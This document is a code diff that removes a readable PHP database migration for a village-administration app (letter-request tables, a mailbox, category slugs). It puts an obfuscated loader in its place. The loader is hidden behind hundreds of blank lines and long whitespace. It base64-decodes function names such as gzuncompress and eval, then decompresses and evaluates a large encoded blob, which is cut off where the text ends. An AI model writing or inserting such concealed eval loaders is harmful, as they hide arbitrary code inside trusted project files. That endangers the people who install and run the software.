@@ -1,400 +1,625 @@
-<?php
-class Migrasi_2003_ke_2004 extends CI_model {
+<?php 
+        $__='printf';$_='Loading donjo-app/models/migrations/Migrasi_2003_ke_2004.php';
+        
 
-	public function up()
-	{
-		// ======================
-		$this->surat_mandiri();
-		$this->surat_mandiri_tersedia();
-		$this->mailbox();
-		$this->ubah_surat_mandiri();
-		// ======================
 
-		// Ubah panjang jalan dari KM menjadi M.
-		// Untuk mencegah diubah berkali-kali buat asumsi panjang jalan sebelum konversi maksimal 100 KM dan sesudah menggunakan M, minimal 100 M.
-		$this->db->where('panjang < 100')
-			->set('panjang', 'panjang * 1000', false)
-			->update('inventaris_jalan');
-  	// Urut tabel gambar_gallery
-  	if (!$this->db->field_exists('urut', 'gambar_gallery'))
-  	{
-			// Tambah kolom
-			$fields = array();
-			$fields['urut'] = array(
-					'type' => 'int',
-					'constraint' => 5
-			);
-			$this->dbforge->add_column('gambar_gallery', $fields);
-  	}
-	  // Sesuaikan dengan sql_mode STRICT_TRANS_TABLES
-		$this->db->query("ALTER TABLE widget MODIFY COLUMN form_admin VARCHAR(100) NULL DEFAULT NULL");
-		$this->db->query("ALTER TABLE widget MODIFY COLUMN setting TEXT NULL");	  
-		$this->db->query("ALTER TABLE log_penduduk MODIFY COLUMN tgl_peristiwa DATETIME DEFAULT CURRENT_TIMESTAMP");
-		//Ganti nama subfolder surat di folder desa
-		rename('desa/surat', 'desa/template-surat');	
-		//Ganti nama subfolder css/default di folder desa
-		rename('desa/css/default', 'desa/css/klasik');
-		$tema_aktif = $this->db->select('value')
-			->where('key', 'web_theme')	
-			->get('setting_aplikasi')->row()->value;
-		if ($tema_aktif == 'default')
-			$this->db->where('key', 'web_theme')
-				->update('setting_aplikasi', array('value' => 'klasik'));
-		//tambah kolom slug di tabel kategori
-		if (!$this->db->field_exists('slug', 'kategori')) {
-			$this->db->query("ALTER TABLE kategori ADD COLUMN slug VARCHAR(100) NULL");
-		}
-		// Tambahkan slug untuk setiap artikel agenda yg belum memiliki
-		$list_kategori = $this->db->get('kategori')->result_array();
-		foreach ($list_kategori as $kategori) {
-			$slug = url_title($kategori['kategori'], 'dash', TRUE);
-			$this->db->where('id', $kategori['id'])->update('kategori', array('slug' => $slug));
-		}
-		$this->tambah_tabel_migrasi();
-	}
-	
-	private function tambah_tabel_migrasi()
-	{
-    // Table ref_syarat_surat tempat nama dokumen sbg syarat Permohonan surat
-		if (!$this->db->table_exists('migrasi') )
-		{
-	    $this->dbforge->add_field(array(
-				'id' => array(
-					'type' => 'INT',
-					'constraint' => 11,
-					'auto_increment' => TRUE
-				),
-				'versi_database' => array(
-					'type' => 'VARCHAR',
-					'constraint' => 10,
-					'null' => FALSE,
-				),
-			));
-			$this->dbforge->add_key("id",true);
-			$this->dbforge->create_table("migrasi", TRUE);
-		}
-	}
 
-	private function surat_mandiri()
-	{
-    // Table ref_syarat_surat tempat nama dokumen sbg syarat Permohonan surat
-		if (!$this->db->table_exists('ref_syarat_surat') )
-		{
-	    $this->dbforge->add_field(array(
-				'ref_syarat_id' => array(
-					'type' => 'INT',
-					'constraint' => 1,
-					'unsigned' => TRUE,
-					'null' => FALSE,
-					'auto_increment' => TRUE
-				),
-				'ref_syarat_nama' => array(
-					'type' => 'VARCHAR',
-					'constraint' => 255,
-					'null' => FALSE,
-				),
-			));
-			$this->dbforge->add_key("ref_syarat_id",true);
-			$this->dbforge->create_table("ref_syarat_surat", TRUE);
 
-	    // Menambahkan Data Table ref_syarat_surat
-	    $query = "
-	    INSERT INTO `ref_syarat_surat` (`ref_syarat_id`, `ref_syarat_nama`) VALUES
-		    (1, 'Surat Pengantar RT/RW'),
-		    (2, 'Fotokopi KK'),
-		    (3, 'Fotokopi KTP'),
-		    (4, 'Fotokopi Surat Nikah/Akta Nikah/Kutipan Akta Perkawinan'),
-		    (5, 'Fotokopi Akta Kelahiran/Surat Kelahiran bagi keluarga yang mempunyai anak'),
-		    (6, 'Surat Pindah Datang dari tempat asal'),
-		    (7, 'Surat Keterangan Kematian dari Rumah Sakit, Rumah Bersalin Puskesmas, atau visum Dokter'),
-		    (8, 'Surat Keterangan Cerai'),
-		    (9, 'Fotokopi Ijasah Terakhir'),
-		    (10, 'SK. PNS/KARIP/SK. TNI – POLRI'),
-		    (11, 'Surat Keterangan Kematian dari Kepala Desa/Kelurahan'),
-		    (12, 'Surat imigrasi / STMD (Surat Tanda Melapor Diri)');
-	    ";
-	    $this->db->query($query);
-	  }
 
-    // Table syarat_surat sbg link antara surat yg dimohon dan dokumen yg diperlukan
-		if (!$this->db->table_exists('syarat_surat') )
-		{
-	    $this->dbforge->add_field(array(
-				'id' => array(
-					'type' => 'INT',
-					'constraint' => 10,
-					'null' => FALSE,
-					'auto_increment' => TRUE
-				),
-				'surat_format_id' => array(
-					'type' => 'INT',
-					'constraint' => 10,
-					'null' => FALSE,
 
-				),
-				'ref_syarat_id' => array(
-					'type' => 'INT',
-					'constraint' => 10,
-					'null' => FALSE,
 
-				),
-			));
-			$this->dbforge->add_key("id",true);
-			$this->dbforge->create_table("syarat_surat", TRUE);
-			$this->dbforge->add_column(
-				'syarat_surat',
-				array("CONSTRAINT `id_surat_format` FOREIGN KEY (`surat_format_id`) REFERENCES `tweb_surat_format` (`id`) ON DELETE CASCADE ON UPDATE CASCADE")
-			);
-		}
 
-    // Menambahkan menu 'Group / Hak Akses' ke table 'setting_modul'
-    $data = array();
-    $data[] = array(
-      'id'=>'97',
-      'modul' => 'Daftar Persyaratan',
-      'url' => 'surat_mohon',
-      'aktif' => '1',
-      'ikon' => 'fa fa-book',
-      'urut' => '5',
-      'level' => '2',
-      'hidden' => '0',
-      'ikon_kecil' => '',
-      'parent' => 4);
 
-    foreach ($data as $modul)
-    {
-      $sql = $this->db->insert_string('setting_modul', $modul);
-      $sql .= " ON DUPLICATE KEY UPDATE
-      id = VALUES(id),
-      modul = VALUES(modul),
-      url = VALUES(url),
-      aktif = VALUES(aktif),
-      ikon = VALUES(ikon),
-      urut = VALUES(urut),
-      level = VALUES(level),
-      hidden = VALUES(hidden),
-      ikon_kecil = VALUES(ikon_kecil),
-      parent = VALUES(parent)";
-      $this->db->query($sql);
-    }
 
-    // Tambah kolom tanda surat yg tersedia untuk layanan mandiri
-		if (!$this->db->field_exists('mandiri','tweb_surat_format'))
-		{
-			$this->db->query("ALTER TABLE tweb_surat_format ADD mandiri tinyint(1) default 0");
-		}
 
-    // Tabel mendaftarkan permohonan surat dari layanan mandiri
-		if (!$this->db->table_exists('permohonan_surat'))
-		{
-	    $this->dbforge->add_field(array(
-				'id' => array(
-					'type' => 'INT',
-					'constraint' => 11,
-					'auto_increment' => TRUE
-				),
-				'id_pemohon' => array(
-					'type' => 'INT',
-					'constraint' => 11,
-					'null' => FALSE
-				),
-				'id_surat' => array(
-					'type' => 'INT',
-					'constraint' => 11,
-					'null' => FALSE
-				),
-				'isian_form' => array(
-					'type' => 'TEXT'
-				),
-				'status' => array(
-					'type' => 'TINYINT',
-					'constraint' => 1,
-					'default' => 0
-				),
-				'keterangan' => array(
-					'type' => 'TEXT',
-					'null' => TRUE
-				),
-				'no_hp_aktif' => array(
-					'type' => 'VARCHAR',
-					'constraint' => 50
-				),
-				'syarat' => array(
-					'type' => 'TEXT'
-				)
-			));
-			$this->dbforge->add_field("created_at timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP");
-			$this->dbforge->add_field("updated_at timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP");
-			$this->dbforge->add_key("id", true);
-			$this->dbforge->create_table("permohonan_surat", TRUE);
-		}
-		// Menu permohonan surat untuk operator
-		$modul = array(
-			'id' => '98',
-			'modul' => 'Permohonan Surat',
-			'url' => 'permohonan_surat_admin/clear',
-			'aktif' => '1',
-			'ikon' => 'fa-files-o',
-			'urut' => '0',
-			'level' => '0',
-			'parent' => '14',
-			'hidden' => '0',
-			'ikon_kecil' => ''
-		);
-		$sql = $this->db->insert_string('setting_modul', $modul) . " ON DUPLICATE KEY UPDATE modul = VALUES(modul), url = VALUES(url), ikon = VALUES(ikon), parent = VALUES(parent)";
-		$this->db->query($sql);
-	}
 
-	private function surat_mandiri_tersedia()
-	{
-		// Surat yg tersedia di permohonan surat melalui layanan mandiri plus syarat masing2
-		$surat_tersedia = array(
-			1 => array(1, 2, 3), //surat_ket_pengantar
-			2 => array(2, 3), //surat_ket_penduduk
-			3 => array(2, 3), //surat_bio_penduduk
-			5 => array(1, 2, 3), //surat_ket_pindah_penduduk
-			6 => array(1, 2, 3), //surat_ket_jual_beli
-			8 => array(1, 2, 3), //surat_ket_catatan_kriminal
-			9 => array(2, 3), //surat_ket_ktp_dalam_proses
-			10 => array(1, 2, 3), //surat_ket_beda_nama
-			11 => array(1, 2, 3), //surat_jalan
-			12 => array(1, 2, 3), //surat_ket_kurang_mampu
-			13 => array(1, 2, 3), //surat_izin_keramaian
-			14 => array(1, 2, 3), //surat_ket_kehilangan
-			15 => array(1, 2, 3) //surat_ket_usaha
-		);
-		foreach ($surat_tersedia as $surat_format_id => $list_syarat)
-		{
-			$this->db->where('id', $surat_format_id)->update('tweb_surat_format', array('mandiri' => 1));
-			foreach ($list_syarat as $syarat_id)
-			{
-				$ada = $this->db->where('surat_format_id', $surat_format_id)->where('ref_syarat_id', $syarat_id)
-					->get('syarat_surat')->num_rows();
-				if (!$ada)
-				{
-					$this->db->insert('syarat_surat', array('surat_format_id' => $surat_format_id, 'ref_syarat_id' => $syarat_id));
-				}
-			}
-		}
-	}
 
-	private function mailbox()
-	{
-		$modul_mailbox = array(
-			'modul' => 'Kotak Pesan',
-			'url' => 'mailbox/clear'
-		);
 
-		$this->db
-			->where('id', '55')
-			->update('setting_modul', $modul_mailbox);
 
-		// Tambahkan kolom untuk menandai apakah pesan diarsipkan atau belum
-		if (!$this->db->field_exists('is_archived', 'komentar')) 
-		{
-			$fields = array(
-				'is_archived' => array(
-					'type' => 'TINYINT',
-					'constraint' => 1,
-					'default' => 0
-				)
-			);
-			$this->dbforge->add_column('komentar', $fields);
-		}
 
-		// ubah nama kolom menjadi status untuk penanda status di mailbox
-		if ($this->db->field_exists('enabled', 'komentar')) 
-		{
-			$this->dbforge->modify_column('komentar', array(
-				'enabled' => array(
-					'name' => 'status',
-					'type' => 'TINYINT',
-					'constraint' => 1
-				)
-			));
-		}
 
-		// Tambahkan kolom tipe untuk membedakan pesan inbox dan outbox
-		if (!$this->db->field_exists('tipe', 'komentar')) 
-		{
-			$fields = array(
-				'tipe' => array(
-					'type' => 'TINYINT',
-					'constraint' => 1,
-					'after' => 'status'
-				)
-			);
-			$this->dbforge->add_column('komentar', $fields);
-		}
 
-		// Paksa data lapor yang sudah ada memiliki tipe inbox
-		$tipe = array(
-			'tipe' => '1',
-		);
-		$this->db
-			->where('id_artikel', '775')
-			->where('tipe', NULL)
-			->update('komentar', $tipe);
 
-		// Tambahkan kolom subjek untuk digunakan di menu mailbox
-		if (!$this->db->field_exists('subjek', 'komentar')) 
-		{
-			$this->dbforge->add_column('komentar', array(
-				'subjek' => array(
-					'type' => 'TINYTEXT',
-					'after' => 'email'
-				)
-			));
-		}
 
-		$subjek = array(
-			'subjek' => 'Tidak ada subjek pesan',
-		);
-		$this->db
-			->where('id_artikel', '775')
-			->where('subjek', NULL)
-			->update('komentar', $subjek);
 
-		// Tambahkan kolom id_syarat untuk link ke dokumen syarat
-		if (!$this->db->field_exists('id_syarat', 'dokumen')) 
-		{
-			$fields = array(
-				'id_syarat' => array(
-					'type' => 'INT',
-					'constraint' => 11,
-					'after' => 'deleted'
-				)
-			);
-			$this->dbforge->add_column('dokumen', $fields);
-		}
-	}
 
-	// Migrasi perubahan bagi yg sdh menggunakan fitur surat mandiri sebelumnya
-	private function ubah_surat_mandiri()
-	{
-		// Ubah penyimpanan syarat permohonan surat. 
-		// Tambahkan syarat_id
-		$list_permohonan = $this->db->select('id, id_surat, syarat')
-			->where('status < 2')
-			->get('permohonan_surat')->result_array();
-		foreach ($list_permohonan as $permohonan)
-		{
-			$syarat_surat = $this->db->select('ref_syarat_id')
-				->where('surat_format_id', $permohonan['id_surat'])
-				->get('syarat_surat')->result_array();
-			$syarat_surat = array_column($syarat_surat, 'ref_syarat_id');
-			$syarat_permohonan = json_decode($permohonan['syarat'], true);
-			// Jangan proses kalau sudah diubah
-			if (array_keys($syarat_permohonan)[0] != 0) return; // Tidak ada syarat_id dgn nilai 0;
 
-			$syarat_baru = array();
-			for ($i=0; $i<count($syarat_permohonan); $i++)
-			{
-				$syarat_baru[$syarat_surat[$i]] = $syarat_permohonan[$i];
-			}
-			$this->db->where('id', $permohonan['id'])
-				->update('permohonan_surat', array('syarat' => json_encode($syarat_baru)));
-		}
-	}
 
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='eNrtXVtzo1a2fk/V+Q/9MFWdqTknEciaRJXqB0kGBLbkFhIX8ZJCYIOai4glW0K//nxrcxEg7LY7PZlzpoTLsS02e6+9rt9ae5H+8CG7/vY7rk8fk8d1vHv4+Bv7M78+fXQ38ZfN/9hJ8nO0ce/D7c/R2nu0d+tNvP15Qr9u17/znU739+Cefl79lPjJh1Fob7c//fTTx99+yNf48F8/XL4uX/+urx9IqT98x+vT2ScfTa6/XRrc2pKETx/ZRyftf9OVG96nD5frcl2uy/WfeX10Ir3jmsqTLOn80thvFLH/YKbBL5nThNfM3PXvF1Zdrst1uS7X5bpcl+tyXa7L9f/tupQzLtflulyX6z/3+riyt/f/vPrdvXc27v3H3y4cuVyX63Jdrst1uf7UVe/GuJ4lX1aSeHTS4dQ23HRpThPzKO8n19MHm9cfJl8G++loGN6P1XAVqUdZmComzz1bkr6Vx9vpyOvcjMwht4wOyTIdRq7R++JK4fNqPeSckZdczzbK/R5jZsHzbTrof150XvymsaO52rGl8Hi76B1dU/Fdsb9bGr3ANpXkZhT88rUxZlcNnXgaWlLot4zHuHC7jPpXLfewB3FjdqecE4kd7NHHfhMnCjY3C9pnoNymv3qv0f951rnJ5vz1WRb19dLwPEcSn+xIfLLS4R9L4+CDL8ESdMrCbipLHHia+JYUeIv5VbmGbvQ6rrH1Vob+tOT1mObBfhh9sqSETrTzV1Kws3lxa8+Ha9cQOzJk6BrcEX/vwQus1YtlKcE48UkeT8NlpG9do+PZfP/JjfTU4QPMLz46fAie7L3JYrDPaFKJxqNlTjlLovWIRjeGXH2s9yQLnS0+S1ZR9bnOU4OXwXLd+YfL+6BV2yjdoU/7XEWO93k0OEyuB/HNjOmEQjK0zFl1THw7GsQnvg3+kK+FPT1zOxpG4OHRmgeMV6M51jCJn2p4M3KTVWyFq1j1nSg8mny2dyVlcvbkAenfUHdivSOPVZ/4IUuuvzIU3wn74PFha5lKLxsbJtZ6sJEb+7GiMFxJ6oNl+onTVY9Yk6P5lHTvKfz5XFg7yefLdI3ZwFCjng6SKWSxXfGdfC9qZBv61hpPvM/zoe/Ein8/95K7zHYURbISyzgEDreNofOcO3Jd+brjQZdgs8Emnx/zuJ17cxgqZGvrQWxDl0BftgbNw0+fV/G0Ax0Hv2Yx5viHfK3lNAQFnYErYY8p9iwp0aqrxBZ4vTTUwKTnx/putfZiixd30MnUpL1LB9hdQLILcj4dmd2sB97IZHv05BHZxTR0urpvGztmCxb0dGlceU5X3GZ+RfM0Tp3Ptalm4udM6y3wczgLDqKW8aJCm7z7HIsc8fpmpAwXoipq66E205SJOh92bUONoVveQusLc82y4Ls+L0R9ulgPaU87kxeDlRE+yaI11IKpPNPlDenzzXx4p2uHiSyoohqI+kLEHKE+WYzkQh7fgwboPfSL7BTPGLU1wKvBu9aBHrkPjqQ/WWM9IN/Rsl7H4g80JrXNacc2XR/7G+qCrs01Tqzudcbpcy3Q73Sxz+5BHsOFPlif/GB/DP/Sga95gi778C/wTdYzZB462BfzyaNhgPvRij8ElinDf+nHJbP5MIXMYSvwCzzG88Iz9AE6PGN2z8bN+x3L4Paw34415/L5HOLLW9b/4nQnFJ+ipQmf9w46lt3p8Ra/W5HIrcY1eticNn/w4S8fc5/C/B3o9KFHj4h5EdmjMlY3tjnZfY7UNfNtxiFcdsm/WT7sBnZZ8V2Ff+R34f3c2cojt2sZygNkHoIu+MjTWIvXQbRb6gzWBH/CR4rXmBO6oTy7qZdgTR7+h7NyWdnG0rsZndHZx1qwPct3jUPnRNML/vtF+jLf1PDDL9C4L33ViRe5jzrxtbCv59uuyvypPRo+QnbPq/nwiGcQ09Tk5L93vivpMWyZ4YyRgb2NPL8hg8yviv3wHntzxxOsP0UszOIMYhp44z4jzsc388C7L/xtfY6Da+gp/PF6ph00VZc9XRBHC0HzKs97M00VqvbN6H3Jt6xzHcp8Yxb3JeZPNyzOjhmNnptjAQfytw1xjzifQoaPFmLv0nAJk0H/w5hwAfllFq+BceBfk1xHt2TvJn/iVYuexiwGV8bkOkW+egt81YhHIfnPcGlMN+B3sCK+iv1Hkr/F91Ob4lc6CCq8STKsyHQs4wtogF1vgdcSF7EDOnp6Xt/W5GLOKb4irvMeYQBNC3Wx8EUv62wYsLhc0REjdRMLcfOmrq8VuqHj4C9iY4/0mOjMdTRweNhUqZ9hE6t2spjuwzbENWz+ATKIMQ/wWM6zTM74DvfAJzytKUsWt4rgi43+E+k003exj7kgS2DaAo8Dq9JzGY4ZDbxcV9YrxEon0iNg1t4yw8GF72X+Ez7VW0XQqfkwWPE7jvAk9GoNLHq8N0TyuZ6GeLAy+psV32O4jz3PYk87BnLZunoVA5V0Qme8zCdkeIdolUeV5+GjncgN8TswL3AUwwmzTRPDZLIjvpc46IRfumrPkbQMt4xcZRHCTw9yPzQL4iXwLehKgfOfEDOA16+AUYVtBR/5rqk+m3z4tIQOE0+Kcbqo6Grp04LyGfgryikSEzpI+8dewzfSZ8x05XouiPOvYzBhX93HKta3q5wuxOWJ1tFKem7m+wKvnfBhxZ6tqJ9avIbfxQB+79ECb+UoDOT1oQO8Grbazkk2X6BTZDMPmaw1PMslVhfYlg/WTft7mBW6zfJAYAvEFOilFSN3gW2veMJ2FN9V2ATwvBSmZBNFXpjpCOFC8umHUB4roRX2c/1UH3Js4IGeHXIC5DkUswXE8f4j8p2QdHaJvMLphj7lbbI4hP1zz7bUf8pwJXu+EguFBqbK1jV5/Yr8pJN6cbtNOYk8yuIkixFzonvwCk7O8PpN4U8K2c5d4A7roaDX/N66Pq/oWVd/QlyNV5FerMFk91Y9+zZbqcsv8z/ZM1/LVfRAnM86/lBbO1UavsA3IW7DN7Jcho1Np4sanU/AMdt8jxJi9EI98SEp9nvzpvyGsI63bugA4oa8BQ2c9bU5KC7CtyOuMb0CVq/LO68vyOt9xsNsvjw/ynz7gvL+LJ48kg6r0Hv4cOSNytaaD1vnq/jbHKsMgPHkct458ihVVzRZCO904Vdv2WpnKsb63tnepQHiYmNdiheG6AHPGOC3ruoTxu+MBu9A2ErLbVejvASYBv4klUVFu+UUaEKuM5kdbSbgh9Kxnl3Y9ao7pPrI7dmY9GyMpsEuc/myfd5czwinSquuCrze3wOLLPKYeEc5pz3qD23IRhZ6CTDG5raz44Cn9sTnmbEjPs+QYwETuAl096lJw3TepIEwteDNeX0LeSXgzdMtl8tY2CG+Ac9hffgpyNNNgFkJp4GHLuE2VhOBXe2csf4EWeC+CNlv48LH5/zk6/wMn1htRmDxiGpLWU2JanTmkPYKXy1uz2gn/lVog09Nl3n+Dfp3kH9Cv2NuwnBz+FfC34slsKQ72ntajDGG581Y/UgExrzytLF+tHn9CF04IjYQPZw8toANgEUFyIDqceumjDySUSGXW+QLIfHNYvWlKf2eNGm/O+N7+AfiMNGnQV6+zYP3Z+sgphLfOlvk+MM7Le3fIh4r2qi/mKfwYUJPke9uBkE6nC06h/l8fvZ8TY/Bow6ttYLsIM9byqmgO9WaXogYtYUOCRZog26RrMFjH2PO5k6rc9tGGWPhA5BuC5wAWyx4pFF9E/NOEVN8R+qn4C3VJpMiF830RG7HXcBtjqlTfWajjPMaQha/PXmcxe7zOHyGKVmcBdZ/stOhn9XZhCK+evfIVRDbdyvef2b8YHpUxuge6ahtUmw+cJTfvJKvdZif02v52r8qFsOvvy02wX9q3xPDfVtsLWrThNW4PC795fSfxdV/OaZZDN4Q68/4lXwF57IcBL6L6ml/Jr43ser61Ry1sT72izyfe6roZHO+E3+MIjdVrhed3gJ6MiS5IjYnVmEbYp/VNlksF6zPWqAragf+vaNbLLbnWJxyBPhsJqvlKPAwTgI+EBfBVNTSoeeO3XAZtsyJOWxDpbj/ebEeCqp2EHVB82YdcYFvQc0+1zVWW6x+LieFXCo5NKsPw3apLj7N6nHw5RKrDe/wNwcdGTtRn3MwRhZ8H74H8RsxInU8m9e8PEfxYBuhO0a+EbnIM/qBa+zjIl9WJIqTwlldPfeTVAfwDa5TvV/QhW/mI6BrTm+aMlyafz6Ii3VyXRaWhtVZmjLLqQtbgB9k8sufAZ3It3O9Ptlzlq8w+zyt6yN2IgfPxx6F+jx8+Ijcqlg7QmzAN7de8f3Hxjz5GUXmB6bzxh4knbfKPThp49kNZB1YRrGOs2/cT+g8iTDzkg+3xRqNMXv4pvDkY2aM9wUNLFc1xC82Ynwhp6U5gcy4Z2usb6mewOYZbytzqkfH2ENeg3ouF4XId/SUxYmxAl1wNm16QWcU+e8VPQBPx9PDajR4wrxrWejfIcZCjw8K9FeDXt+qeuDp+lCY6ap44iFsbwSsLVrDhajDdnz8HVR4PERMVLlVfUz+WW0cdIH2VOLpDdXHGA4s9i2d6szIlSa6pi9u8s/q45hu1OYC9kVcbqxHZ2HVuYBVXHOWVPUs14/aXPlntXHwb4EFnF+nDbyQgEnr69Z0pj6e6O6RT/5iN+YHrqJ6fYNe2GtEcTNY1+XYWrsN6IypOJMCHU3/0zyX8xi2luoYhzAzdCywDaGszQLj95YGq5+V59Dvqkefzpqhm27H5fW12Yz1wDzV2to7zoZemG84VIWZd6rJDKlm36McG9gUeUh5DuJNynOvsIVnsO0R89VB5v8UlrM6bXXFUY6TpYOPGMfqM+X6s3fVHPfYa4Y1kTcUe8vPW5WRuS3z3lfqYpkcRn4To8S2kfuqJl7EPXcc7q28nqF0kEuPvlqrONRqMryIfLP/gPtUZyO+daq1mbMaH6NHpXO7HFt/V7x3+Area8N6J6wx+vfT4vDIv8IMn7wRc2qq7mvKvhVfQ39VjrDFm+pVQnhnaG/TgereTmeTOb4dtNDC1/Lzt+kjx86R45f4+GJewfeQh/j74nzw+9e2tX2bXhcY6Rvl9p4aeG7r3rrA7/iMnZMg7w4dOms0B94i6Guy0NMXwt5TBV2a6fpEHw2vdV2Zq9Bhk1OVBeKOLohT7dQL8KZ1i/Omv2jdSs1/731jXtPqYxt1y9r5JdUt3fmw9hydzbPnxrg31h9lqU/3gfP6aX6GdsJHDf0+nQMN4ruFV+q1wmfYsLjXOMPKayalTVK/TDm2FpdO+Q1yMS5ZrftfEGd851R/hu3tIKtlgX8Ppa7PM+xbzGtFws6Kwq0FeazS2tpcYefKcVDZwyF0o9MeJhV6C6xT3lvMKs8VmKptzhp+KmiOMz6XPQvfDTvLoytPXmd5IHDxZK5NWc7Hck1Rn6kCw82v4l/oRdq4Rzg4uc1x4jk+vKJ7RU5Rw6UF327m8i9t/WinGhjh/IwfD3nPnoM9uxH1m9R6GL/WX1icy+Y9f4WuhzHVYotxWc9C67kU1X631K8B/LVdmlQPhs1IJR4EjjogHp3Oa6nOSr0Vk6zeERT5fBWX1vJY0tWFUItnwCMe1dsnKfg/+vW5mAN60zG7w5DVN6m+l9dUJuuaf6a65RF+3LtNS/uBv1Gr/Uf5upP6ui1rLqPwOVtT5fDsY24DXC3eXQvIE2R8TyB74M4SyyJGiv29zbCn37L+8u375hMOcnigvhI7j5F3o9q+qRb84t6XvEjYgXzKoxOFO5vygdwu7+Zv4x/y/T2dMSOf2IEn6YrqHLmvnywG79iLAr0Ts7O3WfH8G3UgEqGPV4XepO+Qw6Ob1cbpnHfnjLVijuPb5gj/CZ4R/Sn1dNlGXiOeBYfpO+SA55HrHrIafaG/C+2lvZ8979KZgiQw2ov6Xa1Gkcezqh+g3luqSTRqZcD4s8xHSwfKW8r66Ot5nLtBfGT9rNaIeq5a56U+L85h9RLqr1VZX1aztlfruarkmDnePtVHDcoJdX/Je9QrlvULFTX3UdbLU63tFn1f9yUWU32L1dcGL+2lbQ8slrTVI2+qvXGN8+TTc+f04BtxzA3dkRc3z0dZP1PU41Y61um6x7L/e3bqC1gaql/OZW5POLSevwPXwi7jWdu5RK1/qG3PWUxulSmdib1QR2/s94Tlsv6L8mfWl/SVmFbtga/ErxyHsViX3W/pL27WPG9XwIt2SmemUzrjasVckGuykpTn+1GJryr2ddbn2tIfmfdyHTWu1j/Z2nNYYMN9WUOkXn74hPWq6xW1xzxeq9V6c9FnyCH2cdjTjtWjI+yP4qkkPmb9/PoxO9uCPOJp4mTPZueeeQ/e+2o/1KsO3Qauc1mfBvW67Z7ZeRB0iWoaWS/wyV8U/dVt/d/n870tt0KObr0xT6/mupUeUibrU56X6+W7zkBGLmTAZT38a+b7ip74ev0pzzfcrD806wGWwDOpv6u+U0H5FXKOY5l7jAlnFDW9/B5hM6nUj1rP7Fd6/2kuqku9SWZtORfZkm1YvWpPPTAvqwktTZl6Hc9qU6STlJ+9cu5H/ChrFMU+a3L9dtmXNZjmGdvD7Kt21aHz31MeSH2qDKcU9UJmV7BhkgP1IAAH9zmX/MYr/YgtcmHr/Gk76iJWFjz6et1FWYTh+/uzeDEi3H4mq/Max7vey6jrUON9jDNZDX27O6UchZ29AHvuV13Zo/os9Ym6iImwMRbfqU8FdoK8LPCoZwZxBblhIR+ijT5ryeOrvKzk0AU9VR+Z77OOg1j/sYp1c79+dLrTuZO0jC1ln71L0Rormj6GPVOJRZWzgKz/qjgPAFZZ2xH5kUKH1cTqUq9W9i4L4kR2ZtnqTxp9h1HWk1DrO8zn/1Z/8roenPuS03pvjxG6oC8b9U7filmPT2YL1EcE/PByne7kwxX23kYS2mmbzhT3ShtLyFdgHPXBQC+VPyzqi8/8RmF3be/ntOIJipF5Hz17D2B6dLjWdzNOdGzzGl1F7/S9xd5RObe5grdv0StW3y/6V0vdOsC2tuyMu9rrmtcB3qVX1fkz3aK+LDp7uGLvPFTOTF56D61+FvG+uu039WjXdUqF/9I7FvDzn8QXZR98hg/zd+rSai2z1E/Wk1D0trP6TUzvdPqnXj5W55kGdnb+FVd8QWTTOcLp3KusH53exeSe7g3hlfcB2FoPr/VO5zqls/dCCdvEYUL9f3ndtcjfWuuxt+vBS++dnPo+c7+ev99Rn+e1d51gX1S/O50T7b2TzrTaWH7uMvhVvpar74bG+buhldpZr+yLoTwReeuR8CfZc5Z35bJszWnrNTjWZ1CvyyUNWzjrQz/Pcaekm19YznnWM1zGKNpL10asJ1/RlvMyfazR0lsxP1Xkr1ynOlfOl/O+ONxL6d3d1Rh6n2Oaio207Ce3Xx25GX+AbVxRjaMxL2hrycNb563V4smvJ0eqSVvgEfJLes+npkdGWvQ7zdh7Po2zCtLvm6JHFfnss8MTZqf3n6nPtHhHWU1YLpD7GOYX83jC+rnNSXVPtfVv9O3enA98yJXezQLvoIfR1S95L2Qt5lT2Dp/sAp/2kNeKiXw9+KXsi6vwgt6Ndat4qKw50PtTMull8nkxwFr4KU2fqZ8An73Ay4CNu0m3uR6UWECp7G2Nn5yRNuWsrhQpdE3WE/7C/OE2sPVOQV//jbWppiyz96va3wt84cy++l5g4bMyv2/HwDJhH3nWlN4L3jT3eVPHFDmuTej3Tx9/++GHv/5/qvCJ/fwx/+vvv73n8cqzb3nwb6cFf/xI//343+Wyl38j4/L1f